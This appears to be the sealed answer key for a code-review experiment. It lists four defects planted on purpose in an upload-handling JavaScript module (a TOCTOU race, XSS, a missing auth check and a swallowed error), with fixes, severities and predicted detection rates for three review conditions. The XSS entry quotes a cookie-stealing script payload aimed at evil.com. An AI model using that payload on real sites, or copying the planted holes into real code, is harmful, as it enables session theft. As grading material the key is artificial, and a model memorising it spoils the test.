# Phase 7 Trial — Ground Truth

**SEALED — do not read before running all three trial conditions.**

Unsealing this document before running the conditions contaminates the test.
Run Condition A, B, and C, record which issues each found, THEN open this file
to score results.

---

## Embedded issues

### Issue 1 — TOCTOU race condition (Pass 1: Race Conditions/TOCTOU)

**Location:** `reserveSlot()` lines 73–77 (existence check) + `persistUpload()` lines 82–85 (write)

**What it is:**
`fs.existsSync(target)` checks whether the file exists, but the actual write
happens later in a separate call to `persistUpload()` via `fs.promises.writeFile()`.
Between these two calls, another concurrent upload request for the same userId
and filename passes the existence check (file still doesn't exist), proceeds to
`reserveSlot()`, gets the same target path returned, and then `persistUpload()`
on both requests succeed — the second write silently overwrites the first.

**Why it's subtle:**
The check and the write live in different functions with a `handleUpload()` call
in between. Pattern-matching `existsSync` alone doesn't surface the race; you
need to trace the execution path across three functions and recognise the
time-of-check/time-of-use gap.

**Fix:** Use `fs.promises.open(targetPath, 'wx')` (exclusive creation flag) in
`persistUpload()` so the OS atomically rejects a second open on the same path.
Remove the `existsSync` check.

**Expected severity:** P1 (functional defect reachable under concurrent load — not
theoretical on a multi-process upload server)

**Prediction by condition:**
- Condition A (freeform, no framing): LIKELY MISSED — requires cross-function temporal
  reasoning; not surfaced by pattern-matching
- Condition B (misleading framing): LIKELY MISSED — "readability refactor" framing
  focuses attention on the notification function, not the storage layer
- Condition C (kit, security pass explicit race-condition check): LIKELY FOUND — Pass 1
  has an explicit race-condition check requiring temporal reasoning across call paths

---

### Issue 2 — XSS via template literal refactor (Pass 1: Injection)

**Location:** `buildUploadNotification()` lines 115–119

**What it is:**
`displayName` and `filename` are both user-controlled strings interpolated
directly into an HTML template literal without escaping.
- Line 116: `${displayName}` → renders directly as HTML inside `<span>`
- Line 117: `${filename}` → renders directly as HTML inside `<strong>`
- Line 118: `${filename}` → also in an `href` attribute, creating a URL injection
  opportunity as well

An attacker sets their display name to `<script>fetch('https://evil.com/?c='+document.cookie)</script>`
and the notification panel executes it in every viewer's browser.

The `escapeHtml()` function exists in the file (lines 52–59) but is not called here.

**Why it's subtle:**
The PR description says "refactor to template literals — purely readability."
A reviewer who reads the PR description FIRST will think about template syntax
and consistency, not about whether escaping was silently dropped. Under the
`confirmation-bias-framing-effect` (HIGH), this framing collapses security
detection from ~97% to ~4%.

**Fix:** `escapeHtml(displayName)` and `escapeHtml(filename)` in interpolation.
For the href: additionally enforce that filename matches the sanitised pattern.

**Expected severity:** P0 (XSS allowing session hijacking via stored notification)

**Prediction by condition:**
- Condition A (freeform, no framing): LIKELY FOUND — no framing bias; LLM checks
  data flow through HTML interpolation naturally
- Condition B (misleading framing): LIKELY MISSED — "template literal refactor"
  framing suppresses security checks; this is the primary test of the framing
  control research finding
- Condition C (kit, diff-first + dedicated injection check): FOUND — kit's framing
  control prevents bias; injection check explicitly traces every external input
  to first sanitisation point

---

### Issue 3 — Missing auth on processUpload() external entry point (Pass 1: Authentication/Authorization)

**Location:** `processUpload()` lines 165–190; compare with `handleUpload()` lines 129–154

**What it is:**
`handleUpload()` validates the session token and checks for 'upload' permission
before proceeding. `processUpload()` is called internally from the job queue
after handleUpload() — that's fine. But the JSDoc at lines 156–164 states it is
ALSO called directly from a webhook endpoint (`POST /internal/process-upload`)
where `filePath` and `userId` come from the request payload.

`processUpload()` itself has no auth check. It accepts any `filePath` and `userId`
without validation. An attacker who discovers the webhook URL can:
1. Trigger processing of any file path on the server (including files outside
   the upload directory if path is not validated elsewhere)
2. Claim any userId in the resulting index record, poisoning the audit log

**Why it's subtle:**
Both handleUpload() and processUpload() are in the same file and look similar.
handleUpload() has the auth check, so a quick scan reads as "auth is present."
The missing auth is on the secondary code path described in a JSDoc comment —
easy to treat as an implementation detail rather than a security boundary.

**Fix:** Add a service-to-service token check at the webhook route, or add an
explicit token parameter to `processUpload()` that must be validated before
accepting the payload.

**Expected severity:** P1 (auth bypass on an exposed internal endpoint — severity
is P0 if the webhook is publicly reachable without network controls)

**Prediction by condition:**
- Condition A (freeform, no framing): PLAUSIBLE MISS — reviewer sees auth in
  handleUpload() and may not trace the alternate entry point
- Condition B (misleading framing): LIKELY MISSED — framing directs attention to
  notification function
- Condition C (kit, auth/authorization check explicitly traces multi-file auth
  composition): LIKELY FOUND — the kit's auth check asks "are auth checks present
  at every entry point of changed functions?"

---

### Issue 4 — Silent error swallow in readMetadata() (Pass 2: Error handling)

**Location:** `readMetadata()` lines 89–100; consequence at line 153

**What it is:**
The `catch` block at line 97 contains only a comment:
```javascript
  } catch (_err) {
    // file missing or inaccessible
  }
```
The function falls through and returns `undefined` (implicit) when the file
cannot be accessed.

The consequence is visible at line 153 in `handleUpload()`:
```javascript
  const meta = await readMetadata(target);
  return { path: target, size: meta.size, userId: session.userId };
```
If `readMetadata` returns undefined, `meta.size` throws:
`TypeError: Cannot read properties of undefined (reading 'size')`
This surfaces as an unhandled 500 error with no diagnostic information instead
of a meaningful "file write succeeded but metadata read failed" error.

The same null-return also silently masks the TOCTOU consequence in
`processUpload()` line 167: `if (!meta) return null` — a successful overwrite
returns null instead of an error, making the race condition undetectable.

**Why it's subtle:**
Omission defects require "what should be here but isn't" thinking. The code
LOOKS like it handles errors (there's a try/catch). The missing piece is not an
incorrect statement but an absent return/throw statement. Reviewers scanning for
"what's wrong" will see the try/catch and move on.

**Fix:** Replace the swallowed catch with:
```javascript
  } catch (err) {
    throw Object.assign(err, { context: 'readMetadata', filePath });
  }
```
Or return a typed null-object that callers can distinguish from a real metadata
object.

**Expected severity:** P1 (unhandled 500 error path in production; also masks
the TOCTOU race condition consequence)

**Prediction by condition:**
- Condition A (freeform, no framing): PLAUSIBLE MISS — empty catch bodies are
  common in JavaScript; not an obvious "wrong" thing, requires omission thinking
- Condition B (misleading framing): LIKELY MISSED — framing focuses attention elsewhere
- Condition C (kit, Pass 2 explicitly asks for every return path including error
  paths): LIKELY FOUND — kit's omission pass asks "every return path has an
  explicit handling decision; 'let it crash' is valid only if documented"

---

## Scoring table

For each condition, record Y (found) / N (not found) / P (partial — mentioned but
not as a finding with root cause + fix):

| Issue | Condition A (freeform, no framing) | Condition B (freeform, misleading framing) | Condition C (kit) |
|-------|------------------------------------|--------------------------------------------|-------------------|
| 1 TOCTOU                | | | |
| 2 XSS (framing bias)    | | | |
| 3 Missing auth          | | | |
| 4 Silent error swallow  | | | |
| **Total recall**        | /4 | /4 | /4 |

**Primary hypothesis (from research):**
- Issue 2 should show the largest A→B delta (framing collapse from ~97% to ~4%)
- Issue 1 should show the largest A/B→C delta (temporal reasoning, kit-specific check)
- Issue 4 should show a moderate A/B→C delta (omission pass vs default "what's wrong" scan)
- Issue 3 may show modest delta — auth composition is partially visible without the kit

**If Condition C does NOT outperform Condition A on Issues 1 and 4:** the kit's
security pass and omission pass are not functioning. Investigate whether the
passes ran or were short-circuited.

**If Condition B outperforms Condition A on Issue 2:** the framing control
hypothesis is violated — investigate whether the "misleading" framing was
actually misleading enough, or whether the XSS was too obvious.
